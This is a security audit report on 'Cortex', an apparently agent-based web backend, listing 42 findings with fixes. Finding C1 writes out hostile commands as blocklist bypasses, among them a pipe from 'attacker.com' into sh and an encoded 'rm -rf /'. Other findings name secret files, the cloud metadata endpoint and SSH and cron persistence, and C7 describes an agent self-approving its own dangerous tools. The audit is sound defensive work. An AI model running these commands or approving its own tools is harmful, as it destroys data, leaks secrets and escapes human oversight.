# Cortex Security & Reliability Audit Report

Generated: 2026-06-22

---

## Executive Summary

| Severity | Count | Description |
|----------|-------|-------------|
| CRITICAL | 7 | Immediate exploitation risk |
| HIGH | 10 | Significant security gap |
| MEDIUM | 14 | Defense-in-depth weakness |
| LOW | 11 | Hardening opportunity |
| **Total** | **42** | |

---

## Part 1: Critical Vulnerabilities

### C1: Agent `exec_command` passes input directly to shell

**File:** `agents/tools.py:42-66`

The `exec_command` tool uses `create_subprocess_shell` with a blocklist of forbidden patterns (`rm -rf`, `mkfs`, etc.). This is fundamentally insufficient:

**Bypass vectors:**
- `rm -rF /` (capital F)
- `find / -delete`
- `curl attacker.com/malware | sh`
- `python -c 'import os; os.system("rm -rf /")'`
- `echo cm0gLXJmIC8= | base64 -d | bash`
- `nohup rm -rf / &`

**Impact:** Full system compromise. The agent runs as the same user as the backend process, with access to the database, `.env` file (containing `SECRET_KEY`), environment variables, and network.

---

### C2: Agent `_read_file_tool` reads arbitrary files

**File:** `agents/executor.py:216-228`

No path restrictions. Can read:
- `/etc/passwd`, `/etc/shadow`
- `/proc/self/environ` (leaking all environment variables)
- The `.env` file with `SECRET_KEY` and `DATABASE_URL`
- Database files, Redis data
- Other users' vault contents

---

### C3: Agent `_write_file_tool` writes arbitrary files

**File:** `agents/executor.py:230-238`

No path restrictions. Can write:
- Overwrite application code (backdoor injection)
- Write SSH keys to `~/.ssh/authorized_keys`
- Modify `.env` to redirect database to attacker-controlled server
- Create cron jobs for persistence

---

### C4: Agent `web_fetch` enables SSRF

**File:** `agents/tools.py:115-125`

No URL validation. Can fetch:
- `http://169.254.169.254/latest/meta-data/` (cloud metadata)
- `http://localhost:5432/` (database)
- `http://localhost:6379/` (Redis)
- `http://localhost:8000/api/v1/auth/login` (self-SSRF)
- `file:///etc/passwd` (local file read)

---

### C5: Unauthenticated WebSocket endpoint

**File:** `api/ws.py:17-54`, `main.py:208`

`/ws/demo` has zero authentication. Any client can connect and use echo/streaming features. The `ws_router` is included outside `api_router` with no prefix, bypassing all auth middleware.

---

### C6: `.env` with secret key committed to repository

**File:** `.env` line 11

The JWT signing key (`feaf283...`) is present in `.env`. While `.env` is gitignored, the file exists on disk with the production-grade key. Anyone with filesystem access can forge JWTs for any user.

---

### C7: Agent can self-approve dangerous tools

**File:** `agents/executor.py:52-58`

The approval mechanism uses an in-memory set (`_approved_tools`). If the LLM generates a tool call that internally calls `approve_tool()`, it self-approves. The approval is not cryptographically bound to a human approver.

---

## Part 2: High-Severity Issues

### H1: Auth endpoints exempt from rate limiting

**File:** `core/rate_limit.py:27`

Global rate limiter skips `/api/auth` paths. Auth-specific rate limiter uses non-atomic Redis operations (read-modify-write). During Redis outage, brute-force protection is completely disabled.

---

### H2: Refresh token reuse detection doesn't revoke all tokens

**File:** `auth/service.py:183-187`

The comment says "Revoke ALL tokens for this user" but the code only logs and raises 401. An attacker who captures a refresh token can keep using other valid refresh tokens until they expire naturally.

---

### H3: `get_current_user` silently accepts revoked tokens during Redis outage

**File:** `core/db.py:60-61`

The double-decode pattern catches `JWTError` silently. Combined with `is_access_token_revoked` returning `False` on Redis failure, revoked tokens are accepted during outages.

---

### H4: WebSocket auth tokens in URL query string

**Files:** `ws_models.py:17`, `ws_system.py:61`

Tokens appear in server logs, browser history, referrer headers, and proxy logs. No revocation check on WebSocket auth.

---

### H5: `create_run` doesn't verify agent ownership

**File:** `agents.py:71-90`, `run_manager.py:72-83`

A user can create a run against another user's agent ID. The `create_run` method creates the run with the supplied `agent_id` and `current_user.id` but doesn't verify the agent belongs to the user.

---

### H6: Database password logged at startup

**File:** `main.py:99`

`logger.info("System database initialized at %s", db_session.get_database_url())` logs the full database URL including password.

---

### H7: Vault rename allows path separators in `new_name`

**File:** `vault_service.py:471`

`new = old.parent / new_name` — if `new_name` contains `/` or `..`, the resolved path could escape the vault. No validation rejects path separators.

---

### H8: `validate_storage_path()` never called during storage registration

**File:** `storage_registry.py:17`

The validation function exists but is never invoked when registering user storage. Users can register arbitrary filesystem paths as their storage root.

---

### H9: Repository registration has no path restrictions

**File:** `repository.py:85`

Users can register any directory on the filesystem as a repository. Can index `/etc`, `/root`, or other sensitive paths.

---

### H10: Access token lifetime is 2 hours

**File:** `config.py` (ACCESS_TOKEN_EXPIRE_MINUTES=120)

OWASP recommends <=15 minutes for access tokens. 2-hour tokens increase the window for stolen token abuse. No `iat` claim prevents token age checking.

---

## Part 3: Medium-Severity Issues

### M1: All Redis-dependent security fails open

| System | Failure Behavior | Impact |
|--------|-----------------|--------|
| Token revocation | Tokens stay valid | Revoked sessions persist |
| Rate limiting | Requests allowed | DoS protection disabled |
| Brute-force blocking | Blocks not checked | Unlimited login attempts |
| Refresh token storage | Tokens not stored | Next refresh fails |

---

### M2: First-user auto-admin with no verification

**File:** `user_service.py:42-43`

The first registered user gets admin role. In a publicly accessible instance, anyone can become admin by registering first.

---

### M3: Successful login clears rate-limit blocks across all IPs

**File:** `auth/rate_limit.py:30-34`

A successful login from one IP clears the block for ALL IPs targeting that username. An attacker with one valid credential can reset lockouts for brute-force attempts.

---

### M4: Vault password re-encryption is not atomic

**File:** `vault_service.py:579-602`

All files are decrypted into memory, then re-encrypted in a loop. If the process crashes mid-way, some files are encrypted with the new key while others remain with the old key. No rollback mechanism.

---

### M5: Request size bypass via chunked encoding

**File:** `main.py:51-58`

Only checks `Content-Length` header. If missing (chunked transfer encoding), the size limit is bypassed entirely.

---

### M6: `run.error` stores internal exception messages

**File:** `run_manager.py:168`

`run.error = str(e)` stores full exception strings in the database. These are returned via the API, potentially leaking file paths, SQL errors, or stack traces.

---

### M7: `ValueError` messages exposed to API clients

**File:** `agents.py:87`

`raise HTTPException(status_code=404, detail=str(e))` — if ValueError contains internal details, they leak to clients.

---

### M8: Empty `SECRET_KEY` in development mode

**File:** `config.py:62-74`

When `ENV=development`, the secret key defaults to empty string. JWTs signed with an empty key are valid. If development mode is accidentally left on in production, all tokens are forgeable.

---

### M9: `/metrics` endpoint unauthenticated and rate-limit exempt

**File:** `metrics.py`, `rate_limit.py:27`

Exposes uptime, memory usage, request counts, error rates. Useful for attack planning.

---

### M10: WebSocket connections have no per-user limits

**File:** `core/websocket.py`

No maximum connections per user, no message size validation, no rate limiting. A single user can exhaust server resources.

---

### M11: CORS has no production origins configured

**File:** `config.py:30-37`

Default origins are localhost only. Production deployment would need updating, and misconfiguration could allow credential-bearing cross-origin requests.

---

### M12: HSTS header sent over HTTP

**File:** `middleware.py:36`

`strict-transport-security` header is sent even on HTTP responses, which could cause issues if the site is served over HTTP.

---

### M13: Content-Disposition header injection via filenames

**File:** `vault.py:191, 208`

If filename contains `"`, it could break the Content-Disposition header. Low exploitation difficulty but real impact.

---

### M14: `git_diff` vulnerable to flag injection

**File:** `agents/tools.py:92-112`

If `file_path` starts with `-`, it could be interpreted as a git flag (e.g., `--exec`).

---

## Part 4: Low-Severity Issues

### L1: No `SECRET_KEY` rotation mechanism

### L2: Redis has no password in docker-compose

### L3: Password strength validation is weak (no uppercase/special char requirement)

### L4: Export destination not restricted to safe subdirectories

### L5: Repositories with `user_id=NULL` visible to all users

### L6: `SecurePasswordCache.get()` returns immutable strings (Python GC may retain copies)

### L7: CSP dev mode allows `ws://localhost:*` connections

### L8: No `Cache-Control: no-store` on authenticated responses

### L9: No `Permissions-Policy` header

### L10: `x-xss-protection` header is deprecated (CSP is the proper defense)

### L11: Hardcoded DB credentials as defaults in source code

---

## Part 5: Failure Mode Analysis

### Redis Outage

| System | Behavior | Risk |
|--------|----------|------|
| Token revocation | Fail-open (tokens stay valid) | HIGH |
| Rate limiting | Fail-open (requests allowed) | HIGH |
| Brute-force blocking | Fail-open (no checks) | HIGH |
| Refresh token storage | Silent failure | MEDIUM |
| Session management | In-memory fallback (single-worker only) | MEDIUM |

### Database Outage

| System | Behavior | Risk |
|--------|----------|------|
| Auth | 500 errors on all authenticated requests | MEDIUM |
| Health check | Fails readiness probe | LOW |
| Agent execution | Fails with unhandled exception | MEDIUM |

### LLM Provider Outage

| System | Behavior | Risk |
|--------|----------|------|
| Chat | Returns error message to user | LOW |
| Agent execution | Falls back to keyword-based planning | LOW |
| Title generation | Falls back to content truncation | LOW |

### Process Crash During Vault Password Rotation

| State | Impact |
|-------|--------|
| Pre-decryption | No data loss (original state intact) |
| Post-decryption, pre-encryption | **DATA LOSS** — all files decrypted in memory, not yet written |
| Mid-encryption | **PARTIAL DATA LOSS** — some files with new key, some with old |

---

## Part 6: Remediation Priority

### Phase 1: Critical (Fix immediately)

1. Restrict agent file tools to workspace directory (chroot/jail)
2. Remove `exec_command` or replace with `create_subprocess_exec` + allowlist
3. Add URL validation to `web_fetch` (block private IPs, non-HTTP protocols)
4. Remove or authenticate `/ws/demo`
5. Validate agent ownership in `create_run`
6. Remove `.env` from any backup/snapshot that could be accessed

### Phase 2: High (Fix soon)

7. Rate-limit auth endpoints (remove exemption)
8. Fix refresh token reuse detection to actually revoke all tokens
9. Fix `get_current_user` to fail-closed on Redis errors
10. Move WebSocket tokens to secure cookie or handshake header
11. Stop logging database URL at startup
12. Validate `new_name` in vault rename (reject path separators)
13. Call `validate_storage_path()` during storage registration
14. Restrict repository paths to user's home directory
15. Reduce access token lifetime to 15-30 minutes

### Phase 3: Medium (Fix when touching these areas)

16. Add atomicity to vault password rotation (backup-first approach)
17. Sanitize exception messages before DB storage/API return
18. Add Content-Length enforcement at ASGI level
19. Add per-user WebSocket connection limits
20. Add `Cache-Control: no-store` to authenticated responses
21. Fix Content-Disposition header injection
22. Fix `git_diff` flag injection

### Phase 4: Low (Harden opportunistically)

23. Implement `SECRET_KEY` rotation support
24. Add Redis password to docker-compose
25. Strengthen password validation
26. Add `Permissions-Policy` header
27. Remove deprecated `x-xss-protection` header
